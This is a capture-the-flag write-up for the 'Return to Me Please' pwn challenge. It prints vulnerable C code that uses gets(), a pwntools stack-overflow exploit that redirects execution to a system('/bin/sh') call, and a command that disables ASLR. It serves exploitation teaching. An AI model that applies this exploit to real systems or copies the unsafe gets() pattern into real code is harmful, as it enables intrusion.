# 🛠️ Pwn Challenge: **Return to Me Please**  

**Author:** 5N0023  
**Challenge Address:** `nc pwn.akasec.club 2001`  

---

## 🕹️ Challenge Overview  

i already solve it so you can't call me a script kiddie(.)
![Homepage Screenshot](https://github.com/TarPeg007/Akasec-CTF-Writeups/blob/master/photos/Screen%20Shot%202024-11-26%20at%205.07.00%20PM.png?raw=true)

Welcome to the **Return to Me Please** challenge!  
Your mission, should you choose to accept it, is to exploit the binary, hijack control flow, and invoke the magical `system("/bin/sh")` call for a well-deserved shell! 🚀  

Remember:  
- This is a classic **stack buffer overflow** challenge with a little twist.  
- The function `returnToMePlease` *dares* you to break the rules and return control to it.  
- It's a test of precision, wit, and knowledge of binary exploitation.  

---

## 🛡️ The Binary  

Here's the vulnerable source code, straight from the challenge:  

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void returnToMePlease()
{
    int a = 0;
    if (a == 0x1337)
    {
        printf("You are not allowed to call this function\n");
        return;
    }
    system("/bin/sh");
}

int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    char name[0x10];
    printf("return to me please : %p\n", returnToMePlease);
    gets(name);
    return 0;
}
```

### 🚩 Key Observations

**Vulnerability:**
- The `gets()` function allows us to overflow the buffer `name[0x10]` and overwrite important data on the stack (like the return address).

**Target Function:**
- The `returnToMePlease` function contains a call to `system("/bin/sh")`. 
- However, it has a condition that prevents direct access.

**Leak:**
- The address of `returnToMePlease` is printed at runtime, providing a useful starting point for exploitation.

---

## 💻 Exploitation Script

Here's how we exploit the binary using Python and pwntools:

```python
from pwn import *

# Step 1: Connect to the target
p = remote('pwn.akasec.club', 2001)  # Update with the actual host and port
# Uncomment the line below for local testing:
# p = process('./return_to_me_please')  

# Step 2: Read the leaked function address
win = int(p.recvline().split()[-1], 16)
log.info('Address of returnToMePlease: ' + hex(win))

# Step 3: Build the payload
buffer_size = 0x10
saved_base_pointer = 0x8
payload = b'A' * buffer_size        # Overflow the buffer
payload += b'B' * saved_base_pointer  # Overwrite the base pointer
payload += p64(win + 45)           # Redirect execution to `system("/bin/sh")`

# Step 4: Send the payload and interact
p.sendline(payload)
p.interactive()
```

---

## 📖 Useful Resources

### 🎓 Learning Buffer Overflows:
- LiveOverflow YouTube Channel - Hands-on, engaging tutorials on binary exploitation
- RPISEC Modern Binary Exploitation - A full course with practical challenges
- Buffer Overflow Explained (by FuzzySecurity) - Simple and clear explanations

### 🛠️ Tools You'll Love:
- Pwntools Documentation - Your Swiss Army knife for pwn challenges
- GDB + PEDA - Enhance your debugging game
- pwndbg - A powerful GDB plugin for binary exploitation

### 🎮 Practice Platforms:
- pwnable.kr - Practice live CTF-like challenges
- OverTheWire: Narnia - Exploit buffer overflows in a wargame environment
- Hack The Box - Real-world hacking challenges

---

## 💡 Pro Tips

### Understand Your Target
- Use tools like `readelf` or `objdump` to analyze the binary
- Run it locally in gdb and inspect the stack layout

### ASLR Got You Stuck?
Disable ASLR during local testing with:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### Avoid Crashes
- Pay attention to the buffer size and calculate your offsets carefully
- Use cyclic patterns to pinpoint the exact location of the return address:
```python
from pwn import *
pattern = cyclic(100)  # Generate a pattern of 100 bytes
```

### Know the Calling Convention
- On x86-64 systems, remember that the return address sits 8 bytes after the saved base pointer

### Test Locally First
- Always debug and test your exploit on a local copy of the binary before attempting on the challenge server

---

## 🎉 Final Words

Exploitation is an art and a science. It's not just about finding vulnerabilities but about understanding how systems work at their core. 

**Keep practicing, stay curious, and never stop learning!**
